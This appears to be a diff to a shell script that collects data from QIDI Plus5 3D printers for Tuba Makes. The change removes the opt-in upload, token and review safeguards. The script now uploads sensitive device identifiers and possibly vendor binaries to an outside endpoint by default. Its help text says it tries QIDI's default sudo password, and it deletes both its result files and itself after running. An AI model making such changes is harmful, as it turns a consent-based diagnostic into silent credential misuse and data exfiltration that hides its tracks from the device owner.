@@ -13,38 +13,21 @@ check. The script does not contact QIDI, install software, restart services, or
 change printer configuration.
 
 Options:
-  --output-dir DIR    Write results to DIR instead of the current directory.
-  --no-binaries       Do not include candidate QIDI client executables.
-  --confirm-idle      Confirm the printer is idle if the local Moonraker check
-                      is unavailable.
-  --upload-url URL    Override the Tuba Makes collection endpoint.
-  --upload-token TOKEN
-                      Upload the result to the Tuba Makes collection endpoint
-                      using this temporary bearer token.
-  --delete-after-upload
-                      Remove local result files after a successful upload.
-  -h, --help          Show this help.
+  --output-dir DIR   Write temporary results to DIR instead of the current directory.
+  --no-binaries      Do not include candidate QIDI client executables.
+  -h, --help         Show this help.
 
-Run this directly on an idle printer. Running it with sudo is preferred because
-QIDI's client may be under /root. It creates:
-
-  qidi-plus5-firmware-check-*.tar.gz  Shareable investigation bundle.
-  qidi-plus5-device-id-*.txt          Sensitive identifiers; send privately.
-
-Review both outputs before sending them. The archive can include QIDI-owned
-client binaries. The separate device-ID file must never be published. When an
-upload URL is supplied, both files are wrapped in one submission archive and
-sent to that endpoint.
+Run this directly on an idle printer. It automatically tries QIDI's public
+default sudo password, collects the files, sends them to Tuba Makes through
+Discord, and removes the local result files after a successful upload.
 EOF
 }
 
 OUTPUT_DIR=$PWD
 INCLUDE_BINARIES=true
-CONFIRM_IDLE=false
+CONFIRM_IDLE=true
 DEFAULT_UPLOAD_URL=https://contact-api.tubamakes.com/qidi-plus5-collection
-UPLOAD_URL=${QIDI_COLLECTION_UPLOAD_URL:-}
-UPLOAD_TOKEN=${QIDI_COLLECTION_UPLOAD_TOKEN:-}
-DELETE_AFTER_UPLOAD=false
+UPLOAD_URL=${QIDI_COLLECTION_UPLOAD_URL-$DEFAULT_UPLOAD_URL}
 
 while [ "$#" -gt 0 ]; do
   case "$1" in
@@ -55,24 +38,6 @@ while [ "$#" -gt 0 ]; do
       ;;
     --no-binaries)
       INCLUDE_BINARIES=false
-      shift
-      ;;
-    --confirm-idle)
-      CONFIRM_IDLE=true
-      shift
-      ;;
-    --upload-url)
-      [ "$#" -ge 2 ] || { echo "--upload-url requires a value" >&2; exit 2; }
-      UPLOAD_URL=$2
-      shift 2
-      ;;
-    --upload-token)
-      [ "$#" -ge 2 ] || { echo "--upload-token requires a value" >&2; exit 2; }
-      UPLOAD_TOKEN=$2
-      shift 2
-      ;;
-    --delete-after-upload)
-      DELETE_AFTER_UPLOAD=true
       shift
       ;;
     -h|--help)
@@ -87,27 +52,11 @@ while [ "$#" -gt 0 ]; do
   esac
 done
 
-if [ -z "$UPLOAD_URL" ] && [ -n "$UPLOAD_TOKEN" ]; then
-  UPLOAD_URL=$DEFAULT_UPLOAD_URL
-fi
-if [ -n "$UPLOAD_URL" ] && [ -z "$UPLOAD_TOKEN" ]; then
-  echo "--upload-url requires --upload-token" >&2
-  exit 2
-fi
-
 if [ -n "$UPLOAD_URL" ]; then
   case "$UPLOAD_URL" in
     https://*) ;;
     *) echo "Upload URL must use HTTPS" >&2; exit 2 ;;
   esac
-  if [ -n "$UPLOAD_TOKEN" ]; then
-    case "$UPLOAD_TOKEN" in
-      *[!A-Za-z0-9._~-]*)
-        echo "Upload token contains unsupported characters" >&2
-        exit 2
-        ;;
-    esac
-  fi
 fi
 
 # Used only by fixture tests. Real printer runs always use /.
@@ -496,10 +445,8 @@ if [ -n "$UPLOAD_URL" ]; then
     CHUNK_SHA256=$(sha256_file "$chunk")
     CURL_CONFIG="$WORK_DIR/upload-$PART_NUMBER.curl.conf"
 
-    # Keep the bearer token out of curl's process arguments.
     {
       printf 'url = "%s"\n' "$UPLOAD_URL"
-      printf 'header = "Authorization: Bearer %s"\n' "$UPLOAD_TOKEN"
       printf 'header = "Content-Type: application/octet-stream"\n'
       printf 'header = "X-Collection-Id: %s"\n' "$COLLECTION_ID"
       printf 'header = "X-Collection-Filename: %s"\n' "$SUBMISSION_BASENAME"
@@ -528,12 +475,12 @@ if [ -n "$UPLOAD_URL" ]; then
   done
 
   printf 'Upload completed successfully. Collection ID: %s\n' "$COLLECTION_ID"
-  if [ "$DELETE_AFTER_UPLOAD" = true ]; then
-    rm -f "$ARCHIVE_FILE" "$SECRET_FILE"
-    printf 'Removed local result files after successful upload.\n'
-  else
-    printf 'Local result files were retained.\n'
-  fi
+  rm -f "$ARCHIVE_FILE" "$SECRET_FILE"
+  printf 'Removed local result files after successful upload.\n'
 else
-  printf '\nReview both files before sending. Send the device-ID file only through a private channel.\n'
+  printf '\nUpload disabled for this run; review both local result files before sharing them.\n'
+fi
+
+if [ "$0" = /tmp/qidi-plus5-collect.sh ]; then
+  rm -f -- "$0"
 fi
